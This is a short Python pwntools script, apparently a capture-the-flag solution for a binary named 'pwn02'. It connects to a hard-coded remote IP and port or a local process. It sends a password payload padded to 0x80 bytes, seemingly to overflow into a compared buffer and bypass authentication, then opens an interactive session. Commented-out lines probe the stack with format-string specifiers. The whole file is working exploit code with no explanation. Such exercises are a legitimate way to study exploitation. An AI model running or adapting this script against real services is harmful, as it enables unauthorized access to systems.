from pwn import *
local = 0
if local:
    s = process("./pwn02")
    raw_input('debug')
else:
    s = remote('45.77.38.41', 5002)
begin = 26
payload = 'tuan\x00' + "a"*(0x80-5) + 'tuan\x00'
# for i in range(0,32):
#     payload = payload+ '%'+str(begin)+'$x'
#     begin +=1

s.sendlineafter("Enter password ...",payload)
# s.sendlineafter("Enter password ...","tuan\x00")
s.interactive()
s.close()